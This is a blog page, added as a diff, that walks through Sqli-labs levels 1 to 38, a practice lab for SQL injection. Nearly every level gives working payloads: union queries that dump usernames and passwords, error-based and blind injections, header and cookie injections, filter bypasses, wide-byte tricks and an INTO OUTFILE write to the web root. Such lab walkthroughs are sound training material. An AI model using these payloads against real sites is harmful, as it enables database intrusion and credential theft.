@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8" />
+    
+  <meta name="description" content="A tranquility that belongs to you only!" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    Sqli-labs通关攻略 |  Tranquillity
+  </title>
+  
+  <link rel="shortcut icon" href="/feiji.ico" />
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+  
+<script src="/js/pace.min.js"></script>
+
+
+  
+
+  
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+</html>
+
+<body>
+  <div id="app">
+    <main class="content">
+      <section class="outer">
+  <article id="post-Sqli-labs通关攻略" class="article article-type-post" itemscope
+  itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  Sqli-labs通关攻略
+</h1>
+  
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2019/Sqli-labs%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/" class="article-date">
+  <time datetime="2019-12-19T14:59:12.000Z" itemprop="datePublished">2019-12-19</time>
+</a>
+      
+    </div>
+    
+
+    
+    
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+      <h4 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h4><p>如何传参：</p>
+<pre><code>/sqli-labs/Less-1/?id=1</code></pre><p>根据SQL注入思路：<br>第一步判断存不存在注入点：</p>
+<pre><code>/sqli-labs/Less-1/?id=1&#39; and 1=1 --+  //显示正常
+/sqli-labs/Less-1/?id=1&#39; and 1=2 --+ //无显示</code></pre><p>存在注入点，则执行第二步，使用order by查找多少列：</p>
+<pre><code>/sqli-labs/Less-1/?id=1&#39; order by 3 --+ //显示正常
+/sqli-labs/Less-1/?id=1&#39; order by 4 --+ //显示Unknown column &#39;4&#39; in &#39;order clause&#39;</code></pre><a id="more"></a>
+
+<p>当前表存在三列，则执行第三步，使用union联合语句：</p>
+<pre><code>/sqli-labs/Less-1/?id=0&#39; union select 1,2,3 --+ //显示Your Login name:2，Your Password:3</code></pre><p>第二第三列显示，则执行第四步，使用查询语句，查出库名、表名、列名后输出数据：</p>
+<pre><code>/sqli-labs/Less-1/?id=0&#39; union select 1,2,group_concat(username,password) from security.users --+ </code></pre><p><img src="/2019/Sqli-labs%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/1.png" alt></p>
+<hr>
+<h4 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h4><p>输入以下SQL语句：</p>
+<pre><code>/sqli-labs/Less-2/?id=1&#39; and 1=1</code></pre><p><img src="/2019/Sqli-labs%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/2.png" alt></p>
+<p>所以去掉单引号：</p>
+<pre><code>/sqli-labs/Less-2/?id=1&#39; and 1=1 --+ //显示正常</code></pre><p>所以通关语句为：</p>
+<pre><code>/sqli-labs/Less-2/?id=0 union select 1,2,group_concat(username,password) from security.users --+ </code></pre><p><img src="/2019/Sqli-labs%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/3.png" alt></p>
+<hr>
+<h4 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h4><p>输入以下SQL语句：</p>
+<pre><code>/sqli-labs/Less-3/?id=1&#39; and 1=1</code></pre><p><img src="/2019/Sqli-labs%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/4.png" alt></p>
+<pre><code>/sqli-labs/Less-3/?id=1&#39; and 1=1 --+ //正常显示
+/sqli-labs/Less-3/?id=1&#39; and 1=2 --+ //正常显示，则说明1=2没有生效</code></pre><p>所以第三关与第二关的思路还是有区别的，此处多余的单引号可能不是添加，而是没闭合的单引号，所以添加单括号：</p>
+<pre><code>/sqli-labs/Less-3/?id=1&#39;) and 1=1 --+ //正常显示
+/sqli-labs/Less-3/?id=1&#39;) and 1=2 --+ //无显示</code></pre><p>所以通关语句为：</p>
+<pre><code>/sqli-labs/Less-3/?id=0&#39;) union select 1,2,group_concat(username,password) from security.users --+</code></pre><p><img src="/2019/Sqli-labs%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/5.png" alt></p>
+<hr>
+<h4 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h4><p>输入以下SQL语句：</p>
+<pre><code>/sqli-labs/Less-4/?id=1&#39; and 1=1 //显示正常
+/sqli-labs/Less-4/?id=1&#39; and 1=2 //显示正常，1=2不起作用
+/sqli-labs/Less-4/?id=0&#39; or 1=1 --+ //无显示，or 1=1不起作用
+</code></pre><p>联想到php内不止单引号、括号，还有双引号：</p>
+<pre><code>/sqli-labs/Less-4/?id=1&quot; //终于有错误显示</code></pre><p><img src="/2019/Sqli-labs%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/6.png" alt><br>所以尝试以下语句：</p>
+<pre><code>/sqli-labs/Less-4/?id=1&quot;) and 1=1 --+ //显示正常
+/sqli-labs/Less-4/?id=1&quot;) and 1=2 --+ //无显示，说明and 1=2语句生效
+/sqli-labs/Less-4/?id=0&quot;) or 1=1 --+ //显示正常</code></pre><p>所以通关语句：</p>
+<pre><code>/sqli-labs/Less-4/?id=0&quot;) union select 1,2,group_concat(username,password) from security.users --+</code></pre><p><img src="/2019/Sqli-labs%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/7.png" alt></p>
+<hr>
+<h4 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h4><p>第五关的思路：盲注<br>输入语句：</p>
+<pre><code>/sqli-labs/Less-5/?id=0&#39; and 1=1 --+ //无显示
+/sqli-labs/Less-5/?id=1&#39; and 1=2 --+ //无显示
+/sqli-labs/Less-5/?id=0&#39; or 1=1 --+ //正常显示：You are in...........
+/sqli-labs/Less-5/?id=0&#39; union select 1,2,3 --+ //亦显示：You are in...........</code></pre><p>所以现在思考盲注的方法：布尔注入、报错注入、时间注入<br>先使用报错注入：</p>
+<pre><code>/sqli-labs/Less-5/?id=0&#39; and updatexml(1,concat( 0x7e,(select user()),0x7e ),1) --+ //成功显示：XPATH syntax error: &#39;~root@localhost~&#39;</code></pre><p>则通关语句：</p>
+<pre><code>/sqli-labs/Less-5/?id=0&#39; and updatexml(1,concat( 0x7e,(select group_concat(username,password) from security.users),0x7e ),1) --+ //只显示32个字符，所以需要使用substr()函数分割语句
+
+/sqli-labs/Less-5/?id=0&#39; and updatexml(1,concat( 0x7e,substr((select group_concat(username,password) from security.users),1,30),0x7e ),1) --+ //显示：XPATH syntax error: &#39;~DumbDumb,AngelinaI-kill-you,Du~&#39;
+
+/sqli-labs/Less-5/?id=0&#39; and updatexml(1,concat( 0x7e,substr((select group_concat(username,password) from security.users),31,30),0x7e ),1) --+ //显示：XPATH syntax error: &#39;~mmyp@ssword,securecrappy,stupi~&#39;</code></pre><pre><code>/sqli-labs/Less-5/?id=1&#39; UNION SELECT 1, (SELECT 1 from (SELECT count(*), concat(user(), floor(rand(0)*2))x from information_schema.tables group by x)a),3 --+</code></pre><p>通过组合得出结果：<br>DumbDumb,AngelinaI-kill-you,Dummyp@ssword,securecrappy,stupi……</p>
+<hr>
+<h4 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h4><p>第六关的思路：盲注，只是使用双引号闭合<br>由于and构成判断的语句都输出：You are in………..<br>所以考虑盲注：</p>
+<pre><code>/sqli-labs/Less-6/?id=1&#39; and updatexml(1,concat(&quot;~&quot;,(select user()),&quot;~&quot;),1) --+</code></pre><p><img src="/2019/Sqli-labs%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/8.png" alt><br>会出现错误，所以使用双引号闭合：</p>
+<pre><code>//使用count、floor和groud by联合的报错盲注
+/sqli-labs/Less-6/?id=1&quot; union  select 1,(select 1 from (select count(*),concat((select concat(username,&quot;~&quot;,password) from security.users limit 2,1),floor(rand(0)*2))x from information_schema.schemata group by x)a),3 --+  
+
+//关于xml的updatexml()函数的报错盲注
+/sqli-labs/Less-6/?id=1&quot; and updatexml(1,concat(&quot;~&quot;,substr((select group_concat(username,password) from users),1,30),&quot;~&quot;),1) --+ 
+
+//关于extractvalue()函数的报错盲注
+/sqli-labs/Less-6/?id=1&quot; and extractvalue(1,concat(&quot;~&quot;,substr((select group_concat(username,password) from users),1,30),&quot;~&quot;)) --+ </code></pre><hr>
+<h4 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h4><p>第七关的思路：使用into outfile<br>使用dumpfile下载数据到服务器上，路径设为网站的根目录下就可以查看。</p>
+<pre><code>/sqli-labs/Less-7/?id=1&#39;)) union select 1,username,password from security.users into outfile &#39;C:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs\\Less-7\\7.txt&#39; --+</code></pre><p><img src="/2019/Sqli-labs%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/9.png" alt></p>
+<hr>
+<h4 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h4><p>第八关的思路：由于/sqli-labs/Less-8/?id=1’ and 1=1 –+显示；/sqli-labs/Less-8/?id=1’ and 1=2 –+无显示，所以结合if函数，当if为1时，显示，构建语句：</p>
+<pre><code>/sqli-labs/Less-8/?id=1&#39; and if(substr(database(),1,1)=&#39;s&#39;,1,0 ) --+</code></pre><hr>
+<h4 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h4><p>第九关的思路：只显示You are in……，所以使用if()函数与sleep()函数结合，若判断正确则返回1，若不正确则sleep。</p>
+<pre><code>/sqli-labs/Less-9/?id=1&#39; and if(substr(database(),1,1)=&#39;s&#39;,1,sleep(5)) --+</code></pre><hr>
+<h4 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h4><p>第十关的思路：这关跟第九关差不多，第十关的是双引号闭合：</p>
+<pre><code>/sqli-labs/Less-10/?id=1&quot; and if(substr(database(),1,1)=&#39;a&#39;,1,sleep(5)) --+</code></pre><hr>
+<h4 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h4><p>第十一关的思路：POST传输数据，而且有错误输出，所以使用报错注入：</p>
+<pre><code>uname=1&#39; and updatexml(1,(select concat(0x7e,concat(username,password),0x7e) from users limit 0,1),1)  #&amp;passwd=admin&amp;submit=Submit
+
+uname=1&#39; and updatexml(1,(select concat(0x7e,group_concat(username,password),0x7e) from users),1)  #&amp;passwd=admin&amp;submit=Submit
+
+1&#39; union select 1,group_concat(schema_name) from information_schema.schemata #&amp;passwd=admin&amp;submit=Submit</code></pre><hr>
+<h4 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h4><p>根据第十一关的思路，直接使用union联合注入，与第十一关不同的是，第十二关使用双引号和括号闭合：</p>
+<pre><code>uname=1&quot;) union select 1,group_concat(username,password) from users #&amp;passwd=1&amp;submit=Submit</code></pre><hr>
+<h4 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h4><p>第十三关的思路：使语句报错，显示格式，这里是使用单引号和括号闭合，使用union联合没有显示，所以考虑报错注入。</p>
+<pre><code>//使用updatexml()函数报错注入
+uname=1&#39;) and updatexml(1,concat(&quot;~&quot;,(select substr(group_concat(username,password),1,30) from users),&quot;~&quot;),1) #&amp;passwd=1&amp;submit=1Submit
+
+//使用count、floor(rand(0)*2)和group by组合语句报错注入
+uname=1&#39;) and (select 1 from(select count(*),concat((select concat(username,password) from users limit 0,1),floor(rand(0)*2))x from information_schema.schemata group by x)a)#&amp;passwd=1&amp;submit=1Submit </code></pre><hr>
+<h4 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h4><p>第十四关的思路：只有报错才会显示，所以报错注入。还有注意闭合使用的使括号和双引号：</p>
+<pre><code>uname=1)&quot; and extractvalue(1,concat(&quot;~&quot;,(select substr(group_concat(username,password),1,30) from users),&quot;~&quot;)) # &amp;passwd=1&amp;submit=Submit</code></pre><hr>
+<h4 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h4><p>第十五关的思路：没有任何提示，所以考虑布尔注入，使用万能钥匙确认注入点：</p>
+<pre><code>uname=1&#39; or if (1,1,sleep(3)) #&amp;passwd=1&amp;submit=Submit
+
+uname=1&#39; or if (substr(database(),1,1)=&#39;s&#39;,1,sleep(3)) #&amp;passwd=1&amp;submit=Submit</code></pre><hr>
+<h4 id="第十六关"><a href="#第十六关" class="headerlink" title="第十六关"></a>第十六关</h4><p>第十六关的思路：与第十五关差不多，不同的是使用双引号和括号闭合：</p>
+<pre><code>uname=1&quot;) or if(1,1,0)#&amp;passwd=1&amp;submit=Submit
+
+uname=1&quot;) or if (substr(database(),1,1)=&#39;s&#39;,1,sleep(3)) #&amp;passwd=1&amp;submit=Submit
+
+uname=1&quot;) or if(ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))=97,1,sleep(3))#&amp;passwd=1&amp;submit=Submit</code></pre><hr>
+<h4 id="第十七关"><a href="#第十七关" class="headerlink" title="第十七关"></a>第十七关</h4><p>第十七关的思路：尝试两处注入点，发现passwd是注入点，并显示错误，所以结合报错注入：</p>
+<pre><code>uname=admin&amp;passwd=1&#39; and extractvalue(1,concat(&quot;~&quot;,(select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 3,1),&quot;~&quot;)) #&amp;submit=Submit</code></pre><hr>
+<h4 id="第十八关"><a href="#第十八关" class="headerlink" title="第十八关"></a>第十八关</h4><p>第十八关的思路：登录成功后发现关于HTTP的header显示，考虑使用burp suite工具抓包后修改HTTP头信息，实行HTTP头注入，后发现显示报错，所以再结合报错注入：</p>
+<pre><code>User-Agent: 1&#39; and updatexml(1,concat(&quot;~&quot;,(select user()),&quot;~&quot;),1) and &#39;1&#39;=&#39;1
+
+User-Agent: 1&#39; and updatexml(1,concat(0x7e,(select substr(group_concat(username,password),1,30) from users),0x7e),1) and &#39;1&#39;=&#39;1</code></pre><hr>
+<h4 id="第十九关"><a href="#第十九关" class="headerlink" title="第十九关"></a>第十九关</h4><p>第十九关的思路：与第十八关差不多，但header的注入点不同：</p>
+<pre><code>Referer: 1&#39; and extractvalue(1,concat(0x7e,(select concat(username,&quot;~&quot;,password) from users limit 0,1),0x7e)) and &#39;1&#39;=&#39;1</code></pre><hr>
+<h4 id="第二十关"><a href="#第二十关" class="headerlink" title="第二十关"></a>第二十关</h4><p>第二十关的思路：利用burp suite抓包发现HTTP的header多了Cookie: uname=admin ，尝试对这一处进行union联合注入，由于显示错误也可以使用报错输出，并使用limit控制输出：</p>
+<pre><code>Cookie: uname=0&#39; union select 11,username,password from users limit 7,1#
+
+Cookie: uname=0&#39; and updatexml(1,concat(&quot;~&quot;,(select user()),&quot;~&quot;),1)#</code></pre><hr>
+<h4 id="第二十一关"><a href="#第二十一关" class="headerlink" title="第二十一关"></a>第二十一关</h4><p>第二十一关的思路：利用burp suite抓包发现HTTP的header多了Cookie: uname=YWRtaW4%3D ，经过url和base64转码为admin，所以使用第二十关的注入方式，union联合注入和base64转码：</p>
+<pre><code>Cookie: uname=YWRtaW4nKSB1bmlvbiBzZWxlY3QgMSx1c2VybmFtZSxwYXNzd29yZCBmcm9tIHVzZXJzIGxpbWl0IDIsMSM=
+
+Cookie: uname=admin&#39;) union select 1,username,password from users limit 2,1#</code></pre><hr>
+<h4 id="第二十二关"><a href="#第二十二关" class="headerlink" title="第二十二关"></a>第二十二关</h4><p>第二十三关的思路：</p>
+<pre><code>Cookie: uname=YWRtaW4iIHVuaW9uIHNlbGVjdCAxLHVzZXJuYW1lLHBhc3N3b3JkIGZyb20gdXNlcnMgbGltaXQgMiwxIw==
+
+Cookie: uname=admin&quot; union select 1,username,password from users limit 2,1#
+</code></pre><hr>
+<h4 id="第二十三关"><a href="#第二十三关" class="headerlink" title="第二十三关"></a>第二十三关</h4><p>第二十三关的思路：输入判断注入的sql语句发现显示错误，所以使用报错注入，再结合报错提示，修改语法：</p>
+<pre><code>/sqli-labs/Less-23/?id=1&#39; and extractvalue(1,concat(&quot;~&quot;,(select concat(username,password) from users limit 0,1),&quot;~&quot;)) and &#39;1&#39;=&#39;1 
+
+/sqli-labs/Less-23/?id=1%27 or updatexml(1,concat(0x7e,(select concat(username,&quot;~&quot;,password) from users limit 8,1),0x7e),1) and %271%27=%271</code></pre><hr>
+<h4 id="第二十四关"><a href="#第二十四关" class="headerlink" title="第二十四关"></a>第二十四关</h4><p>第二十四关的思路：因为存在注册页面，所以尝试二阶注入，输入账号为 admin’# 后登录 admin’# 账号并修改密码，因为修改密码的过程中会首先搜索此用户，搜索时会导致二次注入，搜索为 admin 用户，所以修改的密码也是admin用户，完成修改后直接登录admin即可：</p>
+<pre><code>username=admin&#39;#&amp;password=1&amp;re_password=1&amp;submit=Register</code></pre><hr>
+<h4 id="第二十五关"><a href="#第二十五关" class="headerlink" title="第二十五关"></a>第二十五关</h4><p>第二十五关的思路：因为对and和or进行替换为空格，所以需要and和or字母中间插入and或者or，进行绕过：</p>
+<pre><code>/sqli-labs/Less-25/?id=1&#39; anandd updatexml(1,concat(1,(select concat(username,passwoorrd) from users limit 2,1),1),1) anandd &#39;1&#39;=&#39;1</code></pre><hr>
+<h4 id="第二十五a关"><a href="#第二十五a关" class="headerlink" title="第二十五a关"></a>第二十五a关</h4><p>第二十五a关的思路：需要布尔值，所以考虑布尔注入，当and后面语句为1即true时显示，为0即false时不显示，and和or关键字绕过：</p>
+<pre><code>/sqli-labs/Less-25a/?id=1 anandd  (select substr(group_concat(username,passwoorrd),1,1)=&#39;D&#39; from security.users)#</code></pre><hr>
+<h4 id="第二十六关"><a href="#第二十六关" class="headerlink" title="第二十六关"></a>第二十六关</h4><p>第二十六关的思路：绕过空格，使用特殊字符：</p>
+<pre><code>/sqli-labs/Less-26/?id=1%27union(select`*`from`users`)||&#39;&#39;=&#39;
+
+/sqli-labs/Less-26/?id=0&#39;||(updatexml(1,concat(0x5e,version(),0x5e),1))||&#39;&#39;=&#39;
+
+//查数据
+/sqli-labs/Less-26/?id=0%27||(updatexml(1,concat(0x5e,(select(group_concat(username))from`users`),0x5e),1))||%27%27=%27</code></pre><hr>
+<h4 id="第二十六a关"><a href="#第二十六a关" class="headerlink" title="第二十六a关"></a>第二十六a关</h4><p>第二十六a关的思路：绕过空格，使用特殊字符：</p>
+<pre><code>/sqli-labs/Less-26a/?id=-1&#39;)aandnd(select(if(substr((select(group_concat(username))from`users`),1,1)=&#39;D&#39;,1,0)))anandd(&#39;1</code></pre><hr>
+<h5 id="第二十七关"><a href="#第二十七关" class="headerlink" title="第二十七关"></a>第二十七关</h5><p>第二十七关的思路：</p>
+<pre><code>/sqli-labs/Less-27/?id=&#39;%a0uNion%a0sElect(1),group_concat(email_id),3%a0from%a0emails%a0uniOn%a0seLect (1),2,&#39;3
+</code></pre><hr>
+<h4 id="第二十七a关"><a href="#第二十七a关" class="headerlink" title="第二十七a关"></a>第二十七a关</h4><p>第二十七a关的思路：闭合后面双引号我就用”1”=”1来闭合，前面还需要&amp;&amp;（%26%26）</p>
+<pre><code>/sqli-labs/Less-27a/?id=-1&quot;%a0And%a0(length(database())&gt;8)%a0UNion%a0SElect%a0(1),(group_concat(username)),(3)from%a0users%a0UNion%a0SElect%a01,2,&quot;3&quot;=&quot;3</code></pre><hr>
+<h4 id="第二十八关"><a href="#第二十八关" class="headerlink" title="第二十八关"></a>第二十八关</h4><p>第二十八关的思路：</p>
+<pre><code>/sqli-labs/Less-28a/?id=1&#39;)and(ascii(substr((sElect%a0database()),1,1))&gt;115)and(&#39;1&#39;)=(&#39;1
+</code></pre><hr>
+<h4 id="第二十八a关"><a href="#第二十八a关" class="headerlink" title="第二十八a关"></a>第二十八a关</h4><p>第二十八a关的思路：</p>
+<pre><code>/sqli-labs/Less-28a/?id=0&#39;)UNion%a0SElect%a01,(group_concat(username)),3%a0from%a0users%a0UNion%a0SELect%a01,2,(&#39;3&#39;)=(&#39;3</code></pre><hr>
+<h4 id="第二十九关"><a href="#第二十九关" class="headerlink" title="第二十九关"></a>第二十九关</h4><p>第二十九关的思路：发现显示错误，考虑报错注入，注意错误信息。</p>
+<pre><code>/sqli-labs/Less-29/?id=1&#39; and extractvalue(1,concat(&quot;~&quot;,(select user()),&quot;~&quot;)) and &#39;1</code></pre><hr>
+<h4 id="第三十关"><a href="#第三十关" class="headerlink" title="第三十关"></a>第三十关</h4><p>第三十关的思路：需要双引号闭合，并控制limit的位置偏移量显示不同数据：</p>
+<pre><code>/sqli-labs/Less-30/?id=-1&quot; union select 1,username,password from users limit 1,1--+</code></pre><hr>
+<h4 id="第三十一关"><a href="#第三十一关" class="headerlink" title="第三十一关"></a>第三十一关</h4><p>第三十一关的思路：有错误显示，所以使用报错注入，根据错误信息调整闭合符号：</p>
+<pre><code>/sqli-labs/Less-31/?id=1&quot;) and updatexml(1,concat(&quot;~&quot;,(substr((select group_concat(username,password) from users),1,30)),&quot;~&quot;),1) --+</code></pre><hr>
+<h4 id="第三十二关"><a href="#第三十二关" class="headerlink" title="第三十二关"></a>第三十二关</h4><p>第三十二关的思路：使用宽字节注入</p>
+<pre><code>/sqli-labs/Less-32/?id=1%ee&#39; union select 1,username,password from users limit 7,1--+</code></pre><hr>
+<h4 id="第三十三关"><a href="#第三十三关" class="headerlink" title="第三十三关"></a>第三十三关</h4><p>第三十三关的思路：使用宽字节注入</p>
+<pre><code>/sqli-labs/Less-33/?id=1%ee&#39; union select 1,username,password from users limit 7,1 --+</code></pre><hr>
+<h5 id="第三十四关"><a href="#第三十四关" class="headerlink" title="第三十四关"></a>第三十四关</h5><p>第三十四关的思路：使用宽字节注入</p>
+<pre><code>uname=admin%df&#39; or 1%23&amp;passwd=&amp;submit=Submit</code></pre><hr>
+<h4 id="第三十五关"><a href="#第三十五关" class="headerlink" title="第三十五关"></a>第三十五关</h4><p>第三十五关的思路：使用二次解码注入</p>
+<pre><code>/sqli-labs/Less-35/?id=1%2527 union select 1,username,password from users limit 7,1 --+</code></pre><hr>
+<h4 id="第三十六关"><a href="#第三十六关" class="headerlink" title="第三十六关"></a>第三十六关</h4><p>第三十六关的思路：使用宽字节注入</p>
+<pre><code>/sqli-labs/Less-36/?id=-1%df%27 union select 1,username,password from users limit 7,1--+</code></pre><hr>
+<h4 id="第三十七关"><a href="#第三十七关" class="headerlink" title="第三十七关"></a>第三十七关</h4><p>第三十七关的思路：将utf-8转换为utf-16</p>
+<pre><code>uname=�&#39; or 1=1#&amp;passwd=&amp;submit=Submit</code></pre><hr>
+<h4 id="第三十八关"><a href="#第三十八关" class="headerlink" title="第三十八关"></a>第三十八关</h4><p>第三十八关的思路：发现存在注入，不能使用union，所以使用if盲注：</p>
+<pre><code>/sqli-labs/Less-38/?id=1&#39; and if(substr(database(),1,1)=&#39;s&#39;,1,0 ) --+</code></pre>
+      
+      <!-- 打赏 -->
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/Sqli-labs%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/" data-id="ck4jy0bl20000cowr9dsy133m"
+        class="article-share-link">Share</a>
+      
+    </footer>
+
+  </div>
+
+  
+  
+  <nav class="article-nav">
+    
+      <a href="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E8%BF%87%E6%94%BB%E7%95%A5/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            XSS闯关小游戏通过攻略
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2019/%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BAhexo%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%95%99%E7%A8%8B/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">使用github搭建hexo静态博客的教程</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+  
+  
+
+  
+  
+  
+
+</article>
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul class="list-inline">
+      <li>
+        &copy;
+        2019
+        GGingyii
+      </li>
+      <li>
+        
+      </li>
+    </ul>
+    <ul class="list-inline">
+      <li>
+        
+        
+        <ul class="list-inline">
+  <li>PV:<span id="busuanzi_value_page_pv"></span></li>
+  <li>UV:<span id="busuanzi_value_site_uv"></span></li>
+</ul>
+        
+      </li>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+    <div class="to_top">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+      </div>
+    </main>
+    
+    <aside class="sidebar">
+      
+        <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/feiji.png" alt="Tranquillity"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">目录</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="Search">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+      </aside>
+      <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+      
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+<script>
+  var ayerConfig = {
+    mathjax: false
+  }
+</script>
+
+
+<script src="/js/ayer.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+
+
+
+<script type="text/javascript" src="https://js.users.51.la/20544303.js"></script>
+  
+  
+  </div>
+</body>
+
+</html>
